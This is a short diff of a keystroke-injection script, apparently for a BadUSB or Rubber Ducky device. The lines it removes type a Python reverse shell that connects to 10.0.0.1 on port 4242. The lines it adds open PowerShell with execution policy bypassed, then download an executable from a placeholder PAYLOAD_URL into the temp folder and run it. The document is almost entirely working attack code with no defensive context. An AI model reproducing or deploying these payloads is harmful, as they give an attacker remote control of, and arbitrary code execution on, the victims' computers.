@@ -1,14 +1,10 @@
-win+r
-\sleep 1
-cmd
-enter
-\sleep 1
-color a
-enter
-@echo off
-enter
-cls
-enter
-python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.0.0.1",4242));
-f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("cmd")'
-enter
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell -NoP -NonI -Exec Bypass
+ENTER
+DELAY 1000
+STRING $Http = new-object -com "WinHttp.WinHttpRequest.5.1";$Http.open("GET","PAYLOAD_URL", $false);$Http.send();[io.file]::WriteAllBytes("$env:temp\p.exe",$Http.responseBody);Start-Process "$env:temp\p.exe"
+ENTER
+DELAY 5000
+ALT F4
